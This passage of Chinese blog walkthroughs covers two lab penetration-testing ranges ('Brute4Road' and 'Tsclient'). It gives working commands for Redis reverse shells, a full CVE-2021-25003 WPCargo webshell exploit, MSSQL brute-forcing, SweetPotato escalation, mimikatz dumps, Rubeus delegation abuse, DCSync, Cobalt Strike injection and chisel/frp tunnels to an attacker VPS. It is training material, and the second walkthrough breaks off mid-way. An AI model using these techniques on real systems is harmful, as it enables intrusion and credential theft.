vpsip</code></p><p>执行上面命令前vps先<code>nc -lvnp 1234</code>监听端口<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122151601.png"></p><p>在执行脚本<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122151740.png"></p><p>利用成功后就可以得到shell<br>使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>创建伪终端，提高shell的交互性；<br>查找flag在&#x2F;home&#x2F;redis&#x2F;flag里面，但是没权限查看<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122153020.png"></p><p>使用命令尝试查找提权方法<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，发现有一个&#x2F;usr&#x2F;bin&#x2F;base64可以利用</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122153406.png"></p><p>利用base64查看得到flag01<br><code>base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</code><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122153900.png"></p><p>flag01: flag{4cac6d19-05e3-4a25-95f9-60914cf000b6}</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><h4 id="上传工具"><a href="#上传工具" class="headerlink" title="上传工具"></a>上传工具</h4><p>先在vps上用python开启http服务以便于内网机器通过curl下载工具<br><code>python3 -m http.server 8888</code><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122160039.png"></p><p>内网机器下载工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -o fscan http://vpsip:8888/fscan</span><br><span class="line">curl -o chisel http://vpsip:8888/chisel</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122160116.png"></p><p>给chisel、fscan<code>chmod +x chisel</code>添加执行权限<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122162258.png"><br>接下来利用工具</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig,ip addr,arp -a 没查到内网ip</span><br><span class="line">hostname -i 和netstat -ano 查到了内网ip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122162331.png"></p><h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p>fscan -h ip&#x2F;24 扫描C段<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122162504.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122162523.png"></p><p>得到内网主机信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.3 DC</span><br><span class="line">172.22.2.7 redis未授权已拿下 </span><br><span class="line">172.22.2.16 mssql </span><br><span class="line">172.22.2.18  wordpress</span><br><span class="line">172.22.2.34  client01</span><br></pre></td></tr></table></figure><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>和frp一样，chisel更方便使用一些<br>vps监听<br><code>./chisel server -p 7000 --reverse</code></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122163411.png"></p><p>内网主机执行<br><code>./chisel client 106.15.2.152:7000 R:0.0.0.0:6666:socks &amp;</code><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122163351.png"></p><p>使用proxifier成功代理<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122200915.png"></p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>使用kali自带的工具wpscan扫描得到wordpress的插件wpcargo6.xx存在CVE<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122200300.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122200225.png"><br>一般打 wordpress 的站点都是先看插件，再看能不能爆破密码<br>带上token可以查看更详细的信息<br><code>proxychains4 wpscan --url http://172.22.2.18/ --api-token xxxxxxx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[!] Title: WPCargo &lt; 6.9.0 - Unauthenticated RCE</span><br><span class="line">|     Fixed in: 6.9.0</span><br><span class="line">|     References:</span><br><span class="line">|      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><span class="line">|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>CVE-2021-25003</strong><br>kali用代理运行exp传一句话木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"> </span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line"> </span><br><span class="line">requests.get(</span><br><span class="line"> </span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line"> </span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line"> </span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line"> </span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122200703.png"></p><p>使用蚁剑选择cmdlinux连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.22.2.18/webshell.php?1=system</span><br><span class="line">POST: 2</span><br></pre></td></tr></table></figure><p>测试连接<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122201036.png"><br>找到wordpress数据库配置文件<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122201401.png"></p><p>使用蚁剑连接MySQL数据库<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122202345.png"></p><p>找到flag02并点击执行得到flag02<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122202445.png">flag{c757e423-eb44-459c-9c63-7625009910d8}</p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>在something表中点击执行得到弱密码，再根据题目提示的猜测是密码表,可以调整limit 0，1000总共999个密码<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123140143.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122205156.png"></p><h3 id="mssql爆破"><a href="#mssql爆破" class="headerlink" title="mssql爆破"></a>mssql爆破</h3><p>使用fscan或者九头蛇爆破<br><code>fscan.exe -h 172.22.2.16 -m mssql -pwdf 1.txt</code>或者<br><code>proxychains4 -q hydra -l sa -P ./pass.txt 172.22.2.16 mssql -f</code>或者超级弱口令检测工具<br>得到账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 172.22.2.16 -m mssql -pwdf password.txt</span><br><span class="line">[+] mssql:172.22.2.16:1433:sa ElGNkOiC</span><br></pre></td></tr></table></figure><h3 id="连接172-22-2-16-mssql数据库"><a href="#连接172-22-2-16-mssql数据库" class="headerlink" title="连接172.22.2.16 mssql数据库"></a>连接172.22.2.16 mssql数据库</h3><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122210319.png"></p><p>直接查看flag文件发现没有权限<br>上传Sweetpotato到users&#x2F;public提权并查看flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p>得到flag文件<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122210755.png"></p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><h3 id="mssql机器信息收集"><a href="#mssql机器信息收集" class="headerlink" title="mssql机器信息收集"></a>mssql机器信息收集</h3><p>使用<code>netstat -ano </code>发现该机器开启了3389远程桌面<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122211221.png"></p><p>使用命令添加用户以便于远程桌面连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user nihao9 nihao9! /add&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122212158.png"><br>并把该用户添加到本地管理员组中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators nihao9 /add &quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122212313.png"></p><p>输入账号密码连接</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122212524.png"></p><p>使用<code>systeminfo</code>、<code>net time /domain</code>信息收集发现该机器在域环境中但是我们登陆的不是域用户<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250122213746.png"></p><p>利用bloodhound查看域环境发现MYSQLSERVER$机器存在到DC的委派，可以利用约束性委派横向移动到DC</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123141651.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>上传mimkatz和Rubeus到该机器</p><p>使用mimikatz抓取hash密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123122802.png"></p><p>得到MSSQLSERVER$机器的hash<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123122733.png"><br><strong>使用RUbeus时发现没有net3.5</strong></p><p><strong>安装net 3.5</strong><br><a href="https://gitcode.com/open-source-toolkit/a78e8/?utm_source=tools_gitcode&index=top&type=card&">sxs下载</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:NetFX3 /Source:D:\sxs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123134049.png"><br>如果上一步出现该情况<br>使用该命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /all /featurename:NetFX3 /Source:D:\sxs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123134027.png"></p><p><strong>使用Rubeus</strong><br>Rubeus的功能类似于模拟kerberos认证，从而生成TGT票据的效果<br>该命令可以为机器账户MSSQLSERVER$生成TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:872156288c17f1f0f2d7ae9af50be9dc /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123134333.png"></p><p>生成高权限ST服务票据并导入命令如下：<br>委派定义：允许服务账户可以代表用户去访问服务，而服务账户就是我们拿到的机器账户。</p><p>因为机器用户有到DC的委派，该命令就是利用机器账户的S4U2Self 扩展代表域管理员 Administrator 请求针对域控 CIFS 服务的票据，并将得到的票据传递到内存中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:上一步得到的TGT票据</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123134446.png"></p><p>导入后我们就是域管理员权限，直接查看DC下的flag04</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250123143720.png"></p><p>在不知道路径的情况下，需要继续利用 LDAP 服务，mimikatz.exe 导出域内用户的 HASH</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure><p>得到管理员哈希,然后<code>crackmapexec smb</code> 传递就可以</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> Brute Force </tag>
            
            <tag> SMB </tag>
            
            <tag> Privilege Elevation </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 春秋云境Brute4Road </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Tsclient</title>
      <link href="/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"/>
      <url>/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/</url>
      
        <content type="html"><![CDATA[<h1 id="Tsclient"><a href="#Tsclient" class="headerlink" title="Tsclient"></a>Tsclient</h1><ul><li>mssql弱口令</li><li>提权</li><li>CS注入在线用户进程上线</li><li>共享文件</li><li>CS不出网转发上线</li><li>映像劫持提权(放大镜提权)</li><li>横向移动</li></ul><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>使用fscan扫描ip<br>     <code>fscan.exe -h 39.99.147.111 -p 1-65536</code><br>    <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115102935.png"><br>扫描出1433 mssql的账户密码，如下<br>    <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115103005.png"></p><p>使用Multiple.Database.Utilization.Tools工具连接数据库<br>    <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250114124136.png"></p><p>激活组件以便于执行命令和上传命令<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115103037.png"></p><p>利用SweetPotato提权并上线到CS<br>先使用CS生成一个artifact_x64.exe木马，并上传到机器<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115103125.png"></p><p>使用提权exe以system权限执行CS生成的木马</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250114124053.png"></p><p>在CS成功上线<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250114124152.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115103651.png"></p><p><code>dir C:\flag* /s /p</code>命令查找flag文件</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250114124448.png"></p><p>使用type命令查看flag01.txt得到第一个flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250114124554.png">flag{1b02a94d-5010-4894-a148-5c3988dbb04e}</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>上传fscan扫描内网C段<br><code>fscan.exe -h 172.22.8.0/24</code></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115104255.png"><br>得到内网信息内网信息如下<br>172.22.8.15 DC<br>172.22.8.18  拿下的第一台机器<br>172.22.8.31  XIAORANG\WIN19-CLIENT<br>172.22.8.46 WIN2016</p><p>用上线的第一台SYSTEM权限机器继续信息收集<br><code>net user</code>,发现有一个john用户<br>执行<code>qwinsta</code>查看会话列表，发现有一个john用户在线</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115105231.png"></p><p>用CS查看进程列表，看看是否有该用户的进程</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115105151.png"></p><p>发现该用户的进程，点击左下角的inject进程注入</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115105214.png"></p><p>成功注入后，得到john用户的shell，如下</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115110938.png"><br>用john的用户信息收集，<br><code>net use</code>发现有共享文件\TSCLIENT\C</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115110954.png"></p><p>先<code>net use \\TSCLIENT\C</code> ,然后查看共享文件 <code>dir \\TSCLIENT\C</code>,发现有个credential.txt文件，用type命令查看该文件<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115111031.png"></p><p>得到一个账户密码和一个使用<a href="https://blog.csdn.net/qq_55202378/article/details/140895624">映像劫持</a>的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure><p>得到了密码就可以尝试密码喷洒，因此需要先做一下内网穿透如下：</p><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>公网服务器监听7000端口<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115111724.png"></p><p>客户端172.22.8.18机器frpc.ini配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr =vps ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks] </span><br><span class="line">type = tcp </span><br><span class="line">remote_port = 6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>客户端执行frp命令<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115113108.png"></p><p>成功穿透回显<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115113124.png"></p><p>也可以使用chisel内网穿透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps</span><br><span class="line">./chisel server -p 7000 --reverse</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">chisel.exe client vps:7000 R:0.0.0.0:6000:socks</span><br><span class="line">或者</span><br><span class="line">./chisel client vps:7000 R:0.0.0.0:6000:socks</span><br></pre></td></tr></table></figure><h3 id="寻找账户密码可以登陆的机器"><a href="#寻找账户密码可以登陆的机器" class="headerlink" title="寻找账户密码可以登陆的机器"></a>寻找账户密码可以登陆的机器</h3><p>kali使用代理密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure><p>发现登录31、15、46机器时，显示密码过期<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115134844.png"></p><p>使用impacket的smbpasswd.py给账户更改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;nihao9@888&#x27;</span><br></pre></td></tr></table></figure><p>密码更改成功<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115135211.png"></p><p>使用kali的远程桌面登录，并设置共享目录，最终只有46这台机器登录成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p &#x27;nihao9@888&#x27; -r disk:share=/home/kali/Desktop/tmp</span><br></pre></td></tr></table></figure><h3 id="转发上线"><a href="#转发上线" class="headerlink" title="转发上线"></a>转发上线</h3><p>使用Aldrich账户的远程桌面，发现该机器不出网，因此想要上线，需要用172.22.8.18这台机器当作监听器，进行转发上线。操作如下：<br>选择18机器的代理转发</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115143300.png"></p><p>设置监听器</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115143317.png"></p><p>生成一个以18这台机器当作监听器的exe木马，操作如下：</p><p>生成木马<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115143337.png"></p><p>选择监听器<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115143407.png"></p><p>并把生成的木马通过kali共享目录传到172.22.8.46这台机器，从而达到上线46这台机器的目的，但是这样的话，上线拿到的权限太低，需要提权再上线。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>提示了映像劫持，就想办法用映像劫持<br>首先查看映像文件执行选项 注册表权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 